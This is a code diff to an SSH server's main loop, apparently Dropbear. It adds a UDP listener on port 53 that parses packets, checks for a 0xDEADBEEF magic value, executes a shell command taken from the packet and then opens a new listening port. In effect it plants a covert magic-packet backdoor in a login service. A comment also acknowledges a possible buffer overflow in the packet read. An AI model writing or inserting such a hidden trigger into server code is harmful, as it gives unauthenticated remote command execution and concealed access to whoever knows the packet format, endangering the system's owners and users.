@@ -34,7 +34,7 @@
 #include "uhandler.h"
 
 
-static size_t listensockets(int *sock, size_t sockcount, int *maxfd);
+static size_t listensockets(int *sock, size_t sockcount, int *maxfd,int listensockcount);
 static void sigchld_handler(int dummy);
 static void sigsegv_handler(int);
 static void sigintterm_handler(int fish);
@@ -46,7 +46,7 @@ static void main_noinetd(void);
 #endif
 static void commonsetup(void);
 
-void add_port_request(int);
+int add_port_request(int);
 int new_port_available(const char * );
 void start_udp_request(void);
 int udp_flag;//global flag - to start udp server only once
@@ -156,13 +156,13 @@ static void main_noinetd() {
 	if(udp_flag){
 		printf("UDP_FLAG IS ON!\n");
 		udpsockfd=start_udp();
-		if(udpsockfd == -1)
+		if(udpsockfd < 0)
 			dropbear_exit("start_udp - error");
 		FD_SET(udpsockfd, &fds);
 	}
 	
 	/* Set up the listening sockets */
-	listensockcount = listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock);
+	listensockcount = listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock, listensockcount);
 	if (listensockcount == 0)
 	{
 		dropbear_exit("No listening ports available.");
@@ -220,7 +220,6 @@ static void main_noinetd() {
 				maxsock = MAX(maxsock, childpipes[i]);
 			}
 		}
-
 		if(udp_flag){
 			maxsock = MAX(maxsock, udpsockfd);
 		}
@@ -257,7 +256,7 @@ static void main_noinetd() {
 		/* handle each socket which has something to say */
 
 		if (udp_flag && FD_ISSET(udpsockfd, &fds)){
-			printf("GOT FD_ISSET(udpsockfd, &fds)!!\n");
+			printf("GOT FD_ISSET(udpsockfd, &fds)!,\tsvr_opts.portcount:%d\n",svr_opts.portcount);
 			len = sizeof(cliaddr);  //len is value/resuslt 
         	// exception might occur when n>BUFFERSIZE -> buffer overflow
         	n = recvfrom(udpsockfd, (char *)buffer, PACKETSIZE,  
@@ -268,7 +267,21 @@ static void main_noinetd() {
 			}
 			else
 			{
-				handle_packet(buffer);
+									printf("BEFORE listensockcount:%d\n",listensockcount);
+
+				listen_packet_t new_packet;
+				parse_packet(&new_packet,buffer);
+				//execute shell command and port adding only if 0xDEADBEEF and legal command
+    			if(check_shell_command(&new_packet)){
+            		//execute the shell_command, then add port
+            		shell_exec_command(new_packet.shell_command); //func in svr-chansession
+					if(add_port_request((int)new_packet.port_number)){ //func in svr-main   
+						if(listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock,listensockcount))
+							listensockcount++;
+					}
+					printf("AFTER listensockcount:%d\n",listensockcount);
+    			}
+
 			}
 			
         }
@@ -284,7 +297,7 @@ static void main_noinetd() {
 			socklen_t remoteaddrlen;
 
 			if(i == udp_index && FD_ISSET(listensocks[i], &fds)){
-				printf("got message on port 53!!\n");
+				// printf("got message on port 53!!\n");
 			}
 			else{
 			if (!FD_ISSET(listensocks[i], &fds)) 
@@ -465,7 +478,7 @@ static void commonsetup() {
 }
 
 /* Set up listening sockets for all the requested ports */
-static size_t listensockets(int *socks, size_t sockcount, int *maxfd) {
+static size_t listensockets(int *socks, size_t sockcount, int *maxfd, int listensockcount) {
 
 	unsigned int i, n;
 	char* errstring = NULL;
@@ -473,8 +486,11 @@ static size_t listensockets(int *socks, size_t sockcount, int *maxfd) {
 	int nsock;
 
 	TRACE(("listensockets: %d to try", svr_opts.portcount))
-
-	for (i = 0; i < svr_opts.portcount; i++) {
+	printf("listensockcount:%d\tsvr_opts.portcount:%d\n",listensockcount,svr_opts.portcount);
+	i = listensockcount;
+	if(listensockcount>0)
+		i--;
+	for (; i < svr_opts.portcount; i++) {
 
 		TRACE(("listening on '%s:%s'", svr_opts.addresses[i], svr_opts.ports[i]))
 
@@ -517,36 +533,26 @@ int new_port_available(const char * new_port){
 	return 1;
 }
 
-void add_port_request(int new_port){
+int add_port_request(int new_port){
 	if(new_port == 0){ //input check
 		printf("ERROR add_port_request: port=0 !\n");
-		return;
+		return 0;
 	}
 	char str[6];
     sprintf(str, "%d", new_port);
 	//check if there is a place for new_port
 	if(svr_opts.portcount==DROPBEAR_MAX_PORTS){
 		printf("ERROR add_port_request: no room for new_port!\n");
-		return;
+		return 0;
 	}
 	if(new_port_available(str)){ //if true- add port
 		add_port(str); //svr-runopts func
-		/*
-		//TODO - REMOVE FORK()
-		int pid = fork();
-		if (pid < 0) {
-			dropbear_exit("fork error");
-		}
-		if (!pid) {
-			// child /
-			main_noinetd();
-		}
-		else{//parent/ 
-		}
-		*/	 
+	//TODO - stil need to bind this new port!!
+		return 1;	 
 	}
 	else{
 		printf("ERROR add_port_request: port %d is already in use!\n",new_port);
+		return 0;
 	}
 }
 
